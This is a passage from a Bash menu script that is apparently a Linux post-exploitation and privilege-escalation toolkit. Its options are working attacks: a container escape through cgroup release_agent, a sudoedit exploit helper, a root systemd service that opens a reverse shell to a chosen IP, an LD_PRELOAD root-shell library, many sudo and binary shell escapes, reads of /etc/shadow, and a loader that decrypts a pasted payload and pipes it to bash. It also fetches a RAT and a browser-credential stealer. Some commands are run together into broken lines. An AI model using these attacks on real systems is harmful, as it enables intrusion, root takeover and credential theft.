		fi
	;;
	"169")
		echo 'stats items' | nc localhost 11211 | grep -oe ':[0-9]*:' | grep -oe '[0-9]*' | sort | uniq | xargs -L1 -I{} bash -c 'echo "stats cachedump {} 1000" | nc localhost 11211'
	;;
	"170")
		Scarica "bettercap/bettercap" "$ENTSSL""bettercap/bettercap/releases/download/v2.29/bettercap_linux_amd64_v2.29.zip" "bettercap_amd64_v2.29.zip"
	;;
	"171")
		mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xecho 1 > /tmp/cgrp/x/notify_on_release
		host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
		echo "$host_path/cmd" > /tmp/cgrp/release_agentecho '#!/bin/sh' > /cmd
		echo "ps aux > $host_path/output" >> /cmd
		chmod a+x /cmdsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
	;;
	"172")
		Scarica "Keramas/Blowhole" "$ENTRAW""Keramas/Blowhole/master/blowhole.py" "blowhole.py"
	;;
	"173")
		Scarica "stealthcopter/deepce" "$ENTRAW""stealthcopter/deepce/master/deepce.sh" "deepce.sh"
	;;
	"174")
		echo "Digit a tar.gz file full path to extract"
		ls *.tar.gz
		read -p "(example, ./example.tar.gz): " FLTR
		if [[ -f "$FLTR" ]];
		then
			tar zxvf "$FLTR"
		fi
	;;
	"175")
		Scarica "nccgroup/go-pillage-registries_1.0_Linux_i386" "$ENTSSL""nccgroup/go-pillage-registries/releases/download/v1.0/go-pillage-registries_1.0_Linux_i386.tar.gz" "go-pillage-registries_1.0_Linux_i386.tar.gz"
	;;
	"176")
		Scarica "nccgroup/go-pillage-registries_1.0_Linux_x86_64" "$ENTSSL""nccgroup/go-pillage-registries/releases/download/v1.0/go-pillage-registries_1.0_Linux_x86_64.tar.gz" "go-pillage-registries_1.0_Linux_x86_64.tar.gz"
	;;
	"177")
		echo "Digit a command with arguments"
		read -p "(example, ls -la): " CMD
		if [[ "$CMD" != "" ]];
		then
			curl -k -XPOST "https://k8s-node-1:10250/run/kube-system/node-exporter-iuwg7/node-exporter" -d "cmd=""$CMD"
		fi
	;;
	"178")
		if [[ -f $(which strace) ]];
		then
			if [[ -f $(which ltrace) ]];
			then
				echo "Digit an executable file name to analyze"
				read -p "(example, ./sysinfo): " EXF
				if [[ -f "$EXF" ]];
				then
					echo "Digit a report file name"
					read -p "(example, sysinfo): " RPF
					if [[ "$RPF" != "" ]];
					then
						strace -f -i -o "$RPF"".strace" "$EXF"
						ltrace -f -i -o "$RPF"".ltrace" "$EXF"
					fi
				fi
			else
				echo "ltrace not found!"
			fi
		else
			echo "strace not found!"
		fi
	;;
	"179")
		Scarica "hasanbulat/tshark" "$ENTSSL""hasanbulat/tshark/raw/master/bin/tshark" "tshark"
	;;
	"180")
		Scarica "hasanbulat/tshark/dumpcap" "$ENTSSL""hasanbulat/tshark/raw/master/bin/dumpcap" "dumpcap"
	;;
	"181")
		Scarica "dylanaraps/neofetch" "$ENTRAW""dylanaraps/neofetch/master/neofetch" "neofetch"
		Scarica "dylanaraps/neofetch/neofetch.1" "$ENTRAW""dylanaraps/neofetch/master/neofetch.1" "neofetch.1"
	;;
	"182")
		echo "testing sudoedit vulnerability..."
		sudoedit -s /
		echo "Digit a command with arguments"
		read -p "(example, perl -e 'print \"A\" x 65536'): " CMD
		if [[ "$CMD" != "" ]];
		then
			echo "Copy and paste this command to escalate privs"
			echo "sudoedit -s '\' \`""$CMD""\`"
		fi
	;;
	"183")
		echo "Digit your IP"
		read -p "(example, 10.11.12.13): " MIP
		if [[ "$MIP" != "" ]];
		then
			echo "Digit your PORT"
			read -p "(example, 4444): " MPRT
			if [[ "$MPRT" != "" ]];
			then
				echo -ne "[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\n\n[Install]\nWantedBy=multi-user.target\n" > test.service
				echo "run 'nc -lvnp ""$MPRT""' in your host or execute linuxallremote and select 102 option"
				read -p "Press enter to run RevShell"
				systemctl enable ./test.service
			fi
		fi
	;;
	"184")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			arp -v -f "$RFL"
		fi
	;;
	"185")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			cut -d "" -f1 "$RFL"
		fi
	;;
	"186")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			base64 "$RFL" | base64 --decode
		fi
	;;
	"187")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			tail "$RFL"
		fi
	;;
	"188")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			ul "$RFL"
		fi
	;;
	"189")
		php5 -r "pcntl_exec('/bin/sh');"
	;;
	"190")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			file -m "$RFL"
		fi
	;;
	"191")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			echo "digit exec cat ""$RFL"
			tclsh8.5
		fi
	;;
	"192")
		env /bin/sh
	;;
	"193")
		echo "Digit a file to read"
		read -p "(example, ./secret.txt): " RFL
		if [[ -f "$RFL" ]];
		then
			diff --line-format=%L /dev/null "$RFL"
		fi
	;;
	"194")
		strace -o /dev/null /bin/sh
	;;
	"195")
		awk 'BEGIN {system("/bin/bash")}'
	;;
	"196")
		sudo find / -exec bash -i \
	;;
	"197")
		find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}'
	;;
	"198")
		echo "After less command, digit 'v' and then digit 'shell'"
		read -p "Press enter to continue"
		sudo less /etc/shadow
	;;
	"199")
		echo "After running more, digit '!/bin/bash'"
		read -p "Press enter to continue"
		echo "test">test.txt
		sudo more test.txt
	;;
	"200")
		find / -user root -perm 400 -print 2>/dev/null
	;;
	"201")
		echo "Digit /bin/sh and the Press Ctrk+T"
		read -p "Press enter to continue"
		sudo nano -s /bin/sh
	;;
	"202")
		sudo apache2 -f /etc/shadow
	;;
	"203")
		echo -ne "#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init(){\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}">testr00t.c
		gcc -fPIC -shared -o /tmp/testr00t.so testr00t.c -nostartfiles & sudo LD_PRELOAD=/tmp/testr00t.so apache2
	;;
	"204")
		getcap -r / 2>/dev/null
	;;
	"205")
		echo "Digit a python full path listed in checking capabilities"
		read -p "(example, /usr/bin/python2.6): " PYT
		if [[ -f "$PYT" ]];
		then
			$PYT -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'
		fi
	;;
	"206")
		Scarica "BenChaliah/Arbitrium-RAT" "$ENTSSL""BenChaliah/Arbitrium-RAT/archive/main.zip" "Arbitrium-RAT.zip"
	;;
	"207")
		Scarica "moonD4rk/HackBrowserData-32bit" "$ENTSSL""moonD4rk/HackBrowserData/releases/download/v0.3.3/hack-browser-data-v0.3.3-linux-32bit.zip" "hack-browser-data-v0.3.3-linux-32bit.zip"
	;;
	"208")
		Scarica "moonD4rk/HackBrowserData-64bit" "$ENTSSL""moonD4rk/HackBrowserData/releases/download/v0.3.3/hack-browser-data-v0.3.3-linux-64bit.zip" "hack-browser-data-v0.3.3-linux-64bit.zip"
	;;
	"209")
		Scarica "deepsecurity-pe/GoGhost" "$ENTSSL""deepsecurity-pe/GoGhost/raw/master/GoGhost_linux_amd64" "GoGhost_linux_amd64"
	;;
	"210")
		echo "Paste the base64 encrypted file"
		read -p "paste now" BFL
		if [[ "$BFL" != "" ]];
		then
			echo "Digit the encrypted file name to create before decrypt it"
			read -p "(example, payload.enc): " ENFL
			if [[ "$ENFL" != "" ]];
			then
				echo "Digit the password to decrypt the file"
				read -p "Password: " PSSWD
				if [[ "$PSSWD" != "" ]];
				then
					base64 -d "$BFL" > "$ENFL"
					echo "Do you want pipe to bash or save it in a file?"
					read -p "Do you want save it (Y/n)? " RSP
					if [[ "$RSP" == "Y" ]];
					then
						unzip -P "$PSSWD" "$ENFL"
					else
						unzip -c -P "$PSSWD" "$ENFL" | bash
					fi
				fi
			fi
		fi
	;;
	"211")
		Scarica "fatedier/frp_386" "$ENTSSL""fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_386.tar.gz" "frp_0.35.1_linux_386.tar.gz"
	;;
	"212")
		Scarica "fatedier/frp_amd64" "$ENTSSL""fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_amd64.tar.gz" "frp_0.35.1_linux_amd64.tar.gz"
	;;
	"213")
		Scarica "fatedier/frp_arm" "$ENTSSL""fatedier/frp/releases/download/v0.35.1/frp_0.35.1_linux_arm.tar.gz" "frp_0.35.1_linux_arm.tar.gz"
	;;
	*)
		echo "error, invalid choice"
	;;
	esac
	read -p "Press ENTER to continue..."
done
